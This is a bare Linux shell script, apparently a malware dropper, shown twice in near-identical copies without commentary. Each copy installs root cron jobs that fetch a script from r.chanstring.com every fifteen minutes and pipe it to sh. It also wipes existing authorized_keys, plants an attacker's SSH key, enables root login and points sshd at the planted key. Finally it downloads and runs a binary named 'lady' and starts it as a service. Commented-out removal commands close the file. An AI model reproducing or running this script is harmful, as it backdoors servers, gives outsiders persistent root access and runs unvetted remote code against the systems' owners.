echo "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/crontabs/root

if [ ! -f "/root/.ssh/KHK75NEOiq" ]; then
    mkdir -p ~/.ssh
    rm -f ~/.ssh/authorized_keys*
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root" > ~/.ssh/KHK75NEOiq
    echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
    echo "RSAAuthentication yes" >> /etc/ssh/sshd_config
    echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
    echo "AuthorizedKeysFile .ssh/KHK75NEOiq" >> /etc/ssh/sshd_config
    /etc/init.d/sshd restart
fi

if [ ! -f "/etc/init.d/lady" ]; then
    if [ ! -f "/etc/systemd/system/lady.service" ]; then
        mkdir -p /opt
        curl -fsSL https://r.chanstring.com/v12/lady_`uname -i` -o /opt/KHK75NEOiq33 && chmod +x /opt/KHK75NEOiq33 && /opt/KHK75NEOiq33
    fi
fi

service lady start
systemctl start lady.service
/etc/init.d/lady start


echo "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/crontabs/root

if [ ! -f "/root/.ssh/KHK75NEOiq" ]; then
    mkdir -p ~/.ssh
    rm -f ~/.ssh/authorized_keys*
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root" > ~/.ssh/KHK75NEOiq
    echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
    echo "RSAAuthentication yes" >> /etc/ssh/sshd_config
    echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
    echo "AuthorizedKeysFile .ssh/KHK75NEOiq" >> /etc/ssh/sshd_config
    /etc/init.d/sshd restart
fi

if [ ! -f "/etc/init.d/lady" ]; then
    if [ ! -f "/etc/systemd/system/lady.service" ]; then
        mkdir -p /opt
        curl -fsSL https://r.chanstring.com/v12/lady_`uname -i` -o /opt/KHK75NEOiq33 && chmod +x /opt/KHK75NEOiq33 && /opt/KHK75NEOiq33
    fi
fi

service lady start
systemctl start lady.service
/etc/init.d/lady start

mkdir -p /opt

# /etc/init.d/lady stop
# systemctl stop lady.service
# pkill /opt/cron
# pkill /usr/bin/cron
# rm -rf /etc/init.d/lady
# rm -rf /etc/systemd/system/lady.service
# rm -rf /opt/KHK75NEOiq33
# rm -rf /usr/bin/cron
# rm -rf /usr/bin/.cron.old
# rm -rf /usr/bin/.cron.new